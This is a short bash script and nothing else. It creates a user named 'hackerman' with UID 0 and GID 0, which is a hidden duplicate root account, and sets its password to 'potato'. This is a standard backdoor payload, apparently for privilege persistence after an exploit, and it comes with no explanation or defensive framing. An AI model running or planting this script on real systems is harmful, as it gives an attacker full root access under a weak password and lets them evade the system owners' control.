#!/bin/bash
/usr/sbin/useradd -ou 0 -g 0 hackerman
echo "hackerman:potato"|/usr/sbin/chpasswd
